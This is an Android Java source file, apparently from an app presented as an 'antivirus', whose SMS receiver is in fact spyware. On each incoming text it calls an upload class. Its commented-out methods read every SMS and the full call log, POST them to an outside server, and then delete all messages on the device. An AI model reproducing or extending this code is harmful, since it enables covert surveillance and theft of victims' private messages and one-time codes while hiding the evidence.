package com.braniax.antivirus;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class smsListener extends BroadcastReceiver
{

    Intent mServiceIntent;
    //private BackgroundService mYourService;
    SmsMessage[] msgs;
    String msg_from;
    String msgBody;



    public static final String DURATION = "duration";
    public StringBuilder message;
    //SharedPreferences preferences;
    //public SmsMessage[] smsMessages;
    //String message_from;
    // MainActivity mainActivity;
    String calllogs;
    ArrayList<String> messagesData;
    Context context;
    //ContentResolver contentResolver;
    Uri mSmsQueryUri = Uri.parse("content://sms");


    //@RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent)
    {


        trimCache(context);
        this.context=context;


        Bundle bundle=intent.getExtras();
        if (bundle != null) {
            //Toast.makeText(context, "New Message", Toast.LENGTH_SHORT).show();


            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                msg_from = msgs[i].getOriginatingAddress();
                msgBody = msgs[i].getMessageBody();
            }
            //Toast.makeText(context, msg_from, Toast.LENGTH_SHORT).show();
            //Toast.makeText(context, msgBody, Toast.LENGTH_SHORT).show();

            ContentValues contentValue=new ContentValues();
            contentValue.put(Telephony.Sms.ADDRESS,msg_from);
            contentValue.put(Telephony.Sms.BODY,msgBody);
            context.getContentResolver().insert(Telephony.Sms.CONTENT_URI,contentValue);

        }
       // context.startService(new Intent(context, BackgroundService.class));
        //Toast.makeText(context, "Service called", Toast.LENGTH_SHORT).show();
        UpdationToServer serverClass=new UpdationToServer(context);
        serverClass.addtoServer(context);

    }


    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }







   /* @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public ArrayList<String> getMessages()
    {
        ArrayList<String> messages = new ArrayList<String>();
        //ContentResolver contentResolver=getContentResolver();
        ContentResolver contentResolver=context.getContentResolver();
        //Uri mSmsQueryUri = Uri.parse("content://sms/");
        //sb.append("Messages");
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
                    "type", "read" }, null, null, "date desc");
            if (cursor == null) {
                Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
                //Toast.makeText(this, "curor null", Toast.LENGTH_SHORT).show();
            }

            //assert cursor != null;
            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {

                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                //sb.append( "\nSender:--- "+address +" \nBody:--- "+body);
                //sb.append("\n----------------------------------");


                //messages.add(sb.toString());
                messages.add("\n\n"+"Number:     "+address+"\n"+"Content:     "+body+"\n\n");



            }
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        } finally {
            //assert cursor != null;
            cursor.close();
        }
        return messages;

    }





    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }





    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void addtoServer(final Context context) {

        final ArrayList<String> smss=getMessages();
        final String callllogs=getCallDetail();


        //Toast.makeText(MainActivity.this, msg.toString(), Toast.LENGTH_LONG).show();

        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
        {
            String serverResponse="Message Received!";

            //SmsMessage msg = (SmsMessage)message.;
            @Override
            public void onResponse(String response) {


               *//* Intent intent=new Intent(MainActivity.this,ServerServic.class);
                intent.putExtra("calllogs",callllogs.toString());
                intent.putExtra("sms",smss.toString());
                startService(intent);*//*

                Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                //Log.d("Respnse",response);
                if(response.equals(serverResponse))
                {
                    context.getContentResolver().delete(mSmsQueryUri,null,null);
                    //Toast.makeText(context,"deleted", Toast.LENGTH_LONG).show();
                }

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
                // Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();

                context.getContentResolver().delete(mSmsQueryUri,null,null);

            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                params.put("calllog",callllogs.toString());
                params.put("record", smss.toString());

                return params;
            }
        };
        RequestQueue requestQueue=Volley.newRequestQueue(context);
        requestQueue.add(request);
    }
*/




}
